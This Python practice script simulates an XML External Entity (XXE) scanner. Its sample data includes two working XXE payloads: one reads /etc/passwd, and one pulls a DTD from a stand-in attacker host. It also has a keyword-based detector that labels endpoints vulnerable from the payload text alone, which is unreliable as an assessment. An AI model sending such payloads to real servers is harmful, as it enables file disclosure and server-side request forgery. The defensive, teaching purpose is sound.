# ==========================================
# Day 80: Automated XML External Entity (XXE) Vulnerability Scanner
# Purpose: Practice web application vulnerability assessment and detection of XXE flaws
# ==========================================

print("=== AUTOMATED XML EXTERNAL ENTITY (XXE) SCANNER ===")

# Simulated XML payloads submitted to various web endpoints
target_requests = [
    {
        "endpoint": "/api/upload",
        "content_type": "application/xml",
        "payload": "<note><to>Alice</to><from>Admin</from><body>System check normal</body></note>"
    },
    {
        "endpoint": "/api/parse-xml",
        "content_type": "application/xml",
        "payload": "<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>"
    },
    {
        "endpoint": "/api/import-feed",
        "content_type": "application/xml",
        "payload": "<data><item>Standard Product Catalog</item></data>"
    },
    {
        "endpoint": "/api/config-sync",
        "content_type": "application/xml",
        "payload": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker-controlled.com/evil.dtd'>%xxe;]><foo>Sync</foo>"
    }
]

def scan_for_xxe(requests):
    print("[*] Initiating automated XML External Entity (XXE) vulnerability scan...\n")
    xxe_alerts = 0
    
    for req in requests:
        endpoint = req["endpoint"]
        payload = req["payload"]
        payload_lower = payload.lower()
        
        # Check if the payload contains external entity definitions or file/url inclusion signatures
        is_vulnerable = any(ind in payload_lower for ind in ["<!entity", "system 'file://", "system 'http://"])
        
        if is_vulnerable:
            xxe_alerts += 1
            print(f"  🚨 [VULNERABILITY DETECTED]: Potential XML External Entity (XXE) Flaw!")
            print(f"     ├─ Target Endpoint: {endpoint}")
            print(f"     ├─ Content-Type: {req['content_type']}")
            print(f"     ├─ Injected Payload: {payload}")
            print(f"     └─ Risk: XML parser processes external entities, risking file disclosure/SSRF.\n")
        else:
            print(f"  ✅ [SECURE]: Endpoint '{endpoint}' processed standard XML payload safely.")
            
    return xxe_alerts

# Run the XXE vulnerability scan
total_vulnerabilities = scan_for_xxe(target_requests)

print("--- XXE ASSESSMENT SUMMARY ---")
if total_vulnerabilities > 0:
    print(f"  ⚠️ [ALERT]: Flagged {total_vulnerabilities} request(s) vulnerable to XXE injection!")
    print(f"     └─ Action Required: Disable external entity resolution (DTD processing) in XML parsers.")
else:
    print("  ✅ [SECURE]: All XML payloads successfully handled without external resolution.")

print("==========================================")